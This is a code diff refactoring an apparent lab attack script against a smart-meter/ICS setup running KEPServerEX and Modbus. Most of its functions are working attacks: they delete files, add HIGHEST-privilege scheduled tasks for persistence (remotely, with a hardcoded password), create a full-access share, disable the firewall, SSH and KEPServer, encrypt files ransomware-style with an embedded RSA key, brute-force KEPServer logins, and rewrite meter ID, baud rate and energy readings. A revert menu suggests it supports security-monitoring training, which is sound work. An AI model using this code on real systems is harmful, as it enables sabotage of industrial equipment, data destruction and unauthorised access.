@@ -20,14 +20,29 @@ from kepconfig import connection, admin, connectivity
 import json
 import sys
 
+
+#############
+# CONSTANTS #
+#############
+
 # Set the path for the shared directory
-copiedpath = "C:\\Windows\\temp\\Smartmeter"
+COPIED_PATH = "C:\\Windows\\temp\\Smartmeter"
 
 # Set the path for the Smart Meter folder
-smartmeterpath = "C:\\Users\\Student\\Documents\\AttackFolder"
+SMARTMETER_PATH = "C:\\Users\\Student\\Documents\\AttackFolder"
+
+WINDOWS_SERVER_IP = "172.16.2.77"
+
+
+###########
+# ATTACKS #
+###########
 
 # Check if the script is running with administrator privileges, if not, restart with elevated privileges
-def check_admin():
+def check_admin() -> None:
+    """
+    Check if script is running wit admin privilege. Else, restart as admin.
+    """
     try:
         isAdmin = windll.shell32.IsUserAnAdmin()
     except AttributeError:
@@ -40,18 +55,72 @@ def delete_files(folder_path):
     for root, dirs, files in walk(folder_path):
         for file in files:
             og = path.join(root, file)
-            dest = path.join(copiedpath, file)
+            dest = path.join(COPIED_PATH, file)
             remove(og)
             print("File: " + str(og) + " is deleted")
+
+def create_scheduled_task() -> None:
+    """
+    Creates scheduled task in windows to execute the attackscript from time to time.
+
+    # TODO: Add comments on how frequent the schtasks run.
+    # FIXME: Might be decpricated once this is done with powershell, as the AttackScript.exe is uselsss
+    """
+    executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe'
+
+    executable_file_parameters = '1'
+
+    task_name1 = 'Smart Meter Testing'
+    task_name2 = 'Smart Meter Testing 2'
+
+    sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
+    sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
+
+    # call(sch1, shell=True)
+    # call(sch2, shell=True)
+
+    # TODO: wait for the PS Command and see if this works.
+    stuff = run(f"powershell.exe New-PSSession -ComputerName {WINDOWS_SERVER_IP} -Credential (New-Object System.Management.Automation.PSCredential -ArgumentList Student, (ConvertTo-SecureString Student12345@ -AsPlainText -Force)) {sch1}", stdout=PIPE, shell=True)
+    print(stuff)
 
 # Copy files from a folder to the shared directory
 def copy_file(folder_path):
     for root, dirs, files in walk(folder_path):
         for file in files:
             og = path.join(root, file)
-            dest = path.join(copiedpath, file)
+            dest = path.join(COPIED_PATH, file)
             copyfile(og,dest)
             print("File: " + str(og) + " is copied")
+
+#Create Shared Folder
+def create_shared_folder():
+    folder_path = r'C:\Windows\temp\Smartmeter'
+
+    # Create the folder if it does not already exist
+    if not path.exists(folder_path):
+        mkdir(folder_path)
+
+    netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
+    if "SmartMeterfolder" in netshare.stdout:
+        print ("SmartMeterfolder has already been shared.")
+    else:
+        # Set the share information
+        share_name = 'SmartMeterfolder'
+        share_path = folder_path
+        share_remark = 'Shared folder for full access'
+
+        # Create the share
+        share_info = {
+            'netname': share_name,
+            'path': share_path,
+            'remark': share_remark,
+            'max_uses': -1,
+            'current_uses': 0,
+            'permissions': ACCESS_ALL,
+            'security_descriptor': None
+        }
+        NetShareAdd(None, 2, share_info)
+        print ("SmartMeterfolder has been shared.")
 
 # Disable the firewall
 def disable_firewall():
@@ -102,7 +171,7 @@ def disable_ssh():
         print("SSH Disabled successfully.\nOk.\n")
     else:
         print("SSH Failed to Disable.\nFail.\n")
-        
+
 # Stop the KEPServerEXV6 service
 def disable_kepserver():
     service_name = "KEPServerEXV6"
@@ -188,54 +257,8 @@ def disable_COMPort():
         print("Device not disabled. \nFail.\n")
 
     remove("script.bat")
-    
 
-#Create Shared Folder
-def Create_Share_folder():
-    folder_path = r'C:\Windows\temp\Smartmeter'
-
-    # Create the folder if it does not already exist
-    if not path.exists(folder_path):
-        mkdir(folder_path)
-
-    netshare = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
-    if "SmartMeterfolder" in netshare.stdout:
-        print ("SmartMeterfolder has already been shared.")
-    else:
-        # Set the share information
-        share_name = 'SmartMeterfolder'
-        share_path = folder_path
-        share_remark = 'Shared folder for full access'
-
-        # Create the share
-        share_info = {
-            'netname': share_name,
-            'path': share_path,
-            'remark': share_remark,
-            'max_uses': -1,
-            'current_uses': 0,
-            'permissions': ACCESS_ALL,
-            'security_descriptor': None
-        }
-        NetShareAdd(None, 2, share_info)
-        print ("SmartMeterfolder has been shared.")
-
-#Create Scheduled Task for deleting files
-def Create_scheduled_task():
-    executable_file_path = r'C:/Windows/temp/SmartMetertest/AttackScript.exe' #Help me change this
-
-    executable_file_parameters = '1'
-
-    task_name1 = 'Smart Meter Testing'
-    task_name2 = 'Smart Meter Testing 2'
-
-    sch1 = f'schtasks /create /tn "{task_name1}" /tr "{executable_file_path} {executable_file_parameters}" /sc minute /mo 1 /f /rl HIGHEST'
-    sch2 = f'schtasks /create /tn "{task_name2}" /tr "{executable_file_path}" /sc onlogon /f /rl HIGHEST'
-
-    call(sch1, shell=True)
-    call(sch2, shell=True)
-
-def encrypt_Files():
+def encrypt_files():
     #public key
     pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFxTm9UT1pTRkI5SjEwVWF3bUNGRgpTWERLeE1tUFRQTDFKQmVyQ2xGbkI0MDJNblBtSVc1WXp6SXo4S29Rc2JzTXhQK3B4SSt4TzJmM283dW1RU0YwCitKdnRFNlRLc2RXN3JCTzJFNzVFekZzUXR0QmdyZEthOXJOL2ZVV3dwUXNFdFBwL1Jnay9XNENRcWZzUFZLQXAKTnFQWE43SllHNjJ0L1Y1Wk8zSTFRYmpHSUJ4UFF1U2ZrODhIa3l5NkdYWE1UOHRaT2pHUHNMUy9wTVkwaVEvUwp6RUh2M2RRYzJXZ2dJY3FBbUFKT0VWS2pyTFBHYlUvdHIzNWw4MDVIbHdoa3RmUXVsQStBR3JLT2JYdDdPK1cvCkxPU21Ib2VnSXJOaHZtRGsvUFRtRGFtYzdhTUIwaTZhZGIrRzFEMU5Sc0RXZEwyS3Rkb0lnMGVGQk9oQ0JtQUQKbndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''
     pubKey = base64.b64decode(pubKey)
@@ -243,7 +266,7 @@ def encrypt_Files():
     #exclude extensions
     excludeExtension = ['.py','.pem', '.exe']
     try:
-        for item in recurseFiles(smartmeterpath): 
+        for item in recurseFiles(SMARTMETER_PATH): 
             filePath = Path(item)
             fileType = filePath.suffix.lower()
 
@@ -331,7 +354,7 @@ def decrypt(dataFile, privatekey):
         print("File have not been encrypted.")
 
 #Run modpoll to change register 40201 to 26
-def changeMeterID():
+def change_meterID():
 
     netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
     if "RUNNING" in netshare.stdout:
@@ -370,7 +393,7 @@ def changeMeterID():
         print("Fail.\n")
 
 
-def clearEnergyReading():
+def clear_energy_reading():
 
     netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
     if "RUNNING" in netshare.stdout:
@@ -409,7 +432,7 @@ def clearEnergyReading():
         print("Error executing the executable file:", e)
         print("Fail.\n")
 
-def bruteForceKEP():
+def kep_bruteforce():
 
     netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
     if "RUNNING" not in netshare.stdout:
@@ -434,7 +457,7 @@ def bruteForceKEP():
             try:
                 server = kepconfig.connection.server(host = '127.0.0.1', port = 57412, user = username, pw = password)
                 output = server.get_project_properties()
-                with open(copiedpath + "\\KEPServerProperties.txt", "w") as f:
+                with open(COPIED_PATH + "\\KEPServerProperties.txt", "w") as f:
                     f.write(str(output))
                 print("Success! Username: " + username + ", Password: " + password + "\nOk.\n")
                 success = 1
@@ -447,7 +470,7 @@ def bruteForceKEP():
         print("\nFail.")
 
 #Run modpoll to change baud rate - Register 40206 
-def changeBaudRate():
+def change_baudrate():
     netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
     if "RUNNING" in netshare.stdout:
         print("Kepserver is running, Stopping now.")
@@ -557,7 +580,7 @@ def checkBaudRate():
 
     return found_baudrate
 
-def getHardwareInfo():
+def smartmeter_get_hardware_info():
     netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
     if "RUNNING" in netshare.stdout:
         print("Kepserver is running, Stopping now.")
@@ -646,25 +669,25 @@ def revert(revertoption):
         
     elif revertoption == "2":
         count = 0
-        cp = run('netsh advfirewall firewall delete rule name="QRadar Test"',stdout=PIPE)
+        cp = run('netsh advfirewall firewall delete rule name="QRadar Test"', stdout=PIPE)
         if "Ok." in cp.stdout.decode('utf-8'):
             count += 1
             print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
         else:
             print("Inbound Firewall Not Removed (TCP/22)")
-        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"',stdout=PIPE)
+        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"', stdout=PIPE)
         if "Ok." in cp.stdout.decode('utf-8'):
             count += 1
             print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
         else:
             print("Inbound Firewall Not Removed (UDP/22)")
-        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"',stdout=PIPE)
+        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"', stdout=PIPE)
         if "Ok." in cp.stdout.decode('utf-8'):
             count += 1
             print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
         else:
             print("Outbound Firewall Not Removed (TCP/22)")
-        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"',stdout=PIPE)
+        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"', stdout=PIPE)
         if "Ok." in cp.stdout.decode('utf-8'):
             count += 1
             print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
@@ -761,7 +784,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         excludeExtension = ['.py','.pem', '.exe']
         
         try:
-            for item in recurseFiles(smartmeterpath): 
+            for item in recurseFiles(SMARTMETER_PATH): 
                 filePath = Path(item)
                 fileType = filePath.suffix.lower()
 
@@ -819,15 +842,15 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
 
     elif revertoption == "8":
         
-        for root, dirs, files in walk(copiedpath):
+        for root, dirs, files in walk(COPIED_PATH):
             for file in files:
                 og = path.join(root, file)
                 remove(og)
                 print("File: " + str(og) + " is deleted")
 
-        if path.exists(copiedpath):
-            rmdir(copiedpath)
-            print(copiedpath + " has beeen removed.")
+        if path.exists(COPIED_PATH):
+            rmdir(COPIED_PATH)
+            print(COPIED_PATH + " has beeen removed.")
 
         netsharechk = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
 
@@ -905,7 +928,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         # Re-Enable Firewall
         print("\n==================================\n")
                
-        cp = run('netsh advfirewall set allprofiles state on',stdout=PIPE , shell=True)
+        cp = run('netsh advfirewall set allprofiles state on', stdout=PIPE, shell=True)
         if cp.stdout.decode('utf-8').strip() == "Ok.":
             print("Revert Firewall diasble successful.")
         else:
@@ -914,25 +937,25 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         # Remove Firewall In/Outbound rules added.
         print("\n==================================\n")
         count = 0
-        cp = run('netsh advfirewall firewall delete rule name="QRadar Test"',stdout=PIPE)
+        cp = run('netsh advfirewall firewall delete rule name="QRadar Test"', stdout=PIPE)
         if "Ok." in cp.stdout.decode('utf-8'):
             count += 1
             print("Inbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
         else:
             print("Inbound Firewall Not Removed (TCP/22)")
-        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"',stdout=PIPE)
+        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 2"', stdout=PIPE)
         if "Ok." in cp.stdout.decode('utf-8'):
             count += 1
             print("Inbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
         else:
             print("Inbound Firewall Not Removed (UDP/22)")
-        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"',stdout=PIPE)
+        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 3"', stdout=PIPE)
         if "Ok." in cp.stdout.decode('utf-8'):
             count += 1
             print("Outbound Firewall Successfully Removed (Un-Blocked: TCP/22)")
         else:
             print("Outbound Firewall Not Removed (TCP/22)")
-        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"',stdout=PIPE)
+        cp = run('netsh advfirewall firewall delete rule name="QRadar Test 4"', stdout=PIPE)
         if "Ok." in cp.stdout.decode('utf-8'):
             count += 1
             print("Outbound Firewall Successfully Removed (Un-Blocked: UDP/22)")
@@ -948,7 +971,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         print("\n==================================\n")
             
         service_name = "KEPServerEXV6"
-        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
+        cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
         output = cp.stdout.decode('utf-8').strip().split()
         if "FAILED" in cp.stdout.decode('utf-8'):
             print("FAILED: " + " ".join(output[4:]))
@@ -1008,7 +1031,7 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         excludeExtension = ['.py','.pem', '.exe']
 
         try:
-            for item in recurseFiles(smartmeterpath): 
+            for item in recurseFiles(SMARTMETER_PATH): 
                 filePath = Path(item)
                 fileType = filePath.suffix.lower()
 
@@ -1022,16 +1045,16 @@ zS4k0XE7GMLQRiQ8pLpFWLAF+t7xU/081wvKpWnmr0iQqPxSUc90qFs=
         # Remove copied file, directory, shared file and Scheduled Task
         print("\n==================================\n")
         
-        for root, dirs, files in walk(copiedpath):
+        for root, dirs, files in walk(COPIED_PATH):
             for file in files:
                 og = path.join(root, file)
                 remove(og)
                 print("File: " + str(og) + " is deleted")
 
 
-        if path.exists(copiedpath):
-            rmdir(copiedpath)
-            print(copiedpath + " has beeen removed.")
+        if path.exists(COPIED_PATH):
+            rmdir(COPIED_PATH)
+            print(COPIED_PATH + " has beeen removed.")
 
         netsharechk = run(['net', 'share'], stdout=PIPE, stderr=PIPE, text=True)
 
@@ -1100,67 +1123,58 @@ def disable_running_schedules() -> None:
     if "SUCCESS:" in output:
         print("Successfully disabled \KEPServerEX 6.12 Tasks Scheduler", file=sys.stdout)
         print("Ok.")
+    
+
+
+########
+# MAIN #
+########
 
 if __name__ == '__main__':
-    attackoption = str(argv[1])
-    if attackoption != "1":
+    attack_option = str(argv[1])
+    
+    if attack_option != "1":
         check_admin()
 
-    if attackoption == "1":
-        try:
-            delete_files(smartmeterpath)
-            if windll.shell32.IsUserAnAdmin():
-                Create_scheduled_task()
-            print("\nOk.\n")
-        except Exception as e:
-            print(e)
-            print("\nFail.\n")
-    elif attackoption == "2":
-        try:
-            Create_Share_folder()
-            copy_file(smartmeterpath)
-            print("\nOk.\n")
-        except Exception as e:
-            print("\nFail.\n")
-    elif attackoption == "3":
-        disable_firewall()
-    elif attackoption == "4":
-        disable_ssh()
-    elif attackoption == "5":
-        disable_kepserver()
-    elif attackoption == "6":
-        run_modinterrupt()
-    elif attackoption == "7":
-        disable_COMPort()
-    elif attackoption == "8":
-        encrypt_Files()
-    elif attackoption == "9":
-        changeMeterID()
-    elif attackoption == "10":
-        clearEnergyReading()
-    elif attackoption == "11":
-        revertoption = str(argv[2])
-        revert(revertoption)
-    elif attackoption == "12":
-        bruteForceKEP()
-    elif attackoption == "13":
-        changeBaudRate()
-    elif attackoption == "14":
-        getHardwareInfo()
-    elif attackoption == "15":
-       kep_server_info()
-    elif attackoption == "16":
-       kep_get_all_users()
-    elif attackoption == "17":
-       kep_enable_user("User1")
-    elif attackoption == "18":
-       kep_disable_user("User1")
-    elif attackoption == "19":
-       kep_get_single_user("User1")
-    elif attackoption == "20":
-       disable_running_schedules()
-    elif attackoption == "-h":
-        print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service.")
-
-    else:
-        print ("Invalid Option! Use option \"-h\" for help!")
+    match attack_option:
+        case "1": # TODO: Push the exception to the function itself
+            try:
+                create_scheduled_task()
+                print("\nOk.\n")
+            except Exception as e:
+                print(e)
+                print("\nFail.\n")
+        
+        case "2": # TODO: Push the exception to the function itself
+            try:
+                create_shared_folder()
+                copy_file(SMARTMETER_PATH)
+                print("\nOk.\n")
+            except Exception as e:
+                print("\nFail.\n")
+        
+        case "3":  disable_firewall()
+        case "4":  disable_ssh()
+        case "5":  disable_kepserver()
+        case "6":  run_modinterrupt()
+        case "7":  disable_COMPort()
+        case "8":  encrypt_files()
+        case "9":  change_meterID()
+        case "10": clear_energy_reading()
+        
+        case "11":
+            revert_option = str(argv[2])
+            revert(revert_option)
+        
+        case "12": kep_bruteforce()
+        case "13": change_baudrate() # TODO: Disable and enable kep server function, simplifying function 13 and 14
+        case "14": smartmeter_get_hardware_info()
+        case "15": kep_server_info()
+        case "16": kep_get_all_users()
+        case "17": kep_enable_user("User1")
+        case "18": kep_disable_user("User1")
+        case "19": kep_get_single_user("User1")
+        case "20": disable_running_schedules()
+        case "-h":
+            print("\nChoose \n1 Delete file, \n2 Copy file, \n3 Disable firewall, \n4 Disable ssh through firewall, \n5 Disable Kepserver, \n6 Interrupt modbus reading, \n7 Disable COMPORT, \n8 Encrypt files, \n9 Change Meter25 Id to 26, \n10 Clear Energy Reading, \n11 Revert with options, \n12 Bruteforce KEPServer Password, \n13 Disable sshd Service, \n14 Get hardware info, \n15 Obtain KEPServer info, \n16 Get all KEPServer Users, \n17 Enable KEP Users, \n18 Disable KEP Users, \n19 Obtain KEP User Info.")
+        case _: print("Invalid Option! Use option \"-h\" for help!")
